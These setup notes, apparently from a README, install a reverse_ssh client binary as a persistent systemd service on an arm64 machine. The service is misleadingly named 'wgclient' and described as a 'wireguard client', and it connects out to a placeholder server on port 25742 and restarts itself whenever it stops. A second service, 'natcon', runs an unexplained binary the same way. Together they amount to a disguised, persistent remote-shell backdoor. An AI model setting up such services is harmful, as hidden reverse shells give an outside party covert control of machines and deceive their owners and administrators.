# client

reverse_ssh-2.1.3 is client binary compiled for arm64

sudo nano /etc/systemd/system/wgclient.service
```
[Unit]
Description=wireguard client
After=network.target

[Service]
Type=simple
ExecStart=/etc/client -d putServerAddressHere:25742 --foreground
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```
sudo systemctl daemon-reload
sudo systemctl enable wgclient.service
sudo systemctl start wgclient.service

# natcon

sudo nano /etc/systemd/system/natcon.service
```
[Unit]
Description=NAT connection manager
After=network.target

[Service]
Type=simple
ExecStart=/etc/natcon
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

sudo systemctl daemon-reload
sudo systemctl enable natcon.service
sudo systemctl start natcon.service